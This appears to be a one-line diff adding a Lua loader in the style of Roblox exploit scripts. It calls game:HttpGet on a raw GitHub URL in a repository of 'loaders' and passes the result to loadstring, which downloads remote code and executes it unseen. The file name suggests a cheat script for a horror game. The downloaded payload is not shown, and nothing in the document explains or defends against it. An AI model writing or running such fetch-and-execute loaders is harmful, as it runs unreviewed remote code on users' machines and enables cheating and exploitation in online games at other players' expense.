@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/it-wants-in-horror-spam2-669dng3ko91nov.lua"))()
